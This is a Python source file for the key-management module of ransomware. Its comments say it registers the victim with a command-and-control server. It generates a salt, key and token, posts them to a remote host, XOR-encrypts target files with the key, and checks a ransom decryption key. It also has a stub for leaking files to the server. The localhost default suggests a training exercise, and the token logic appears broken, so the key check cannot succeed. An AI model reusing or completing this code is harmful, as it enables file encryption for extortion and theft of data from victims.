from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        # Derivation

        kdf = PBKDF2HMAC(
            algorithm = hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        key = kdf.derive(key)
        return key

    def create(self)->Tuple[bytes, bytes, bytes]:
        # Generate salt, key, and token
        token = secrets.token_bytes(self.TOKEN_LENGTH)
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)

        return salt, key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        data = {
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
        }
        url = f'https://{self._remote_host_port}/new'
        response = requests.post(url,json = data) 

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")):
            raise FileExistsError("Cryptographic data already exists")

        # Generate the cryptographic elements
        self._salt, self._key, self._token = self.create()

        # Create storage
        os.makedirs(self._path, exist_ok = True)

        # Save data in local files
        with open(os.path.join(self._path, "salt.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path, "token.bin"), "wb") as token_file:
            token_file.write(self._token)
        self.post_new(self._salt, self._key, self._token)


    def load(self)->None:
        # function to load crypto data
        salt_file_path = os.path.join(self._path, "salt.bin")
        token_file_path = os.path.join(self._path, "token.bin")

        # Check if the files exist
        if not os.path.exists(salt_file_path) or not os.path.exists(token_file_path):
            raise FileNotFoundError("Files not found.")

        # Load the data 
        with open(salt_file_path, "rb") as salt_file, open(token_file_path, "rb") as token_file:
            self._salt = salt_file.read()
            self._token = token_file.read()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        token = self.do_derivation(self._salt, candidate_key)
        return token == self._token

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        _key = base64.b64decode(b64_key)
        if self.check_key(_key):
            self._key = _key
            self._log.info("Key set")
        else : 
            raise ValueError("Wrong key")

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        return sha256(base64.b64decode(self._token)).hexdigest()


    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file in files:
            file = xorfile(file, self._key)

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target

        # define paths
        salt_file = os.path.join(self._path, "salt.bin")
        token_file = os.path.join(self._path, "token.bin")

        # if salt/token exists, delete
        try:
            if os.path.exists(salt_file):
                os.remove(salt_file)
                self._log.info("Salt deleted")

            if os.path.exists(token_file):
                os.remove(token_file)
                self._log.info("Token deleted")
        # Handle errors
        except Exception as error:
            self._log.error(f"Error cleaning local cryptographic files: {error}")
